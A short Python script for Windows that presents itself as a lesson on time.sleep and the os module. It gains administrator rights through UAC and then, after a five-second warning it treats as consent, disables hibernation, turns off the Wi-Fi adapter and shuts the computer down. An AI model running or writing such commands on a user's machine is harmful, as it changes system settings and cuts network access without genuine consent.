import time
import os
import sys
import ctypes
def run_as_admin():
    """Relaunch the script with administrator rights (UAC)."""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()
    except Exception:
        return False
if not run_as_admin():
    print("Failed to obtain administrator rights. The script will exit in 3 seconds.")
    time.sleep(3)
    sys.exit(1)
print("the project has started.")
print(str(3))
time.sleep(1)
print(str(2))
time.sleep(1)
print(str(1))
time.sleep(1)
print('os is operating system.')
time.sleep(2)
print('time.sleep(number) makes you rest whatever seconds. time.sleep(7.5) makes you wait 7.5 seconds. i will make you wait 1.8757832 seconds.')
time.sleep(1.8757832)
print('see?')
print("time to make a small change. by running this, you are agreeing to let me change your settings. 5 seconds to click off if you do not agree.")
time.sleep(5)
print("boom, changing...")
time.sleep(3)
os.system("powercfg -h off")
print("finally, the hibernation files are gone. they just sit there and do nothing. freed up some space. youre welcome.")
time.sleep(0.95743948456837645482795658945634258888884954653458273953)
print("what next...")
time.sleep(3)
os.system('netsh interface set interface name="Wi-Fi" admin=disabled')
print('ok, it is time. goodbye. rebooting pc')
for i in range(3, 0, -1):
    print(str(i) + "...")
    time.sleep(1)
print("shutdown initiating")
os.system("shutdown /s /t 2")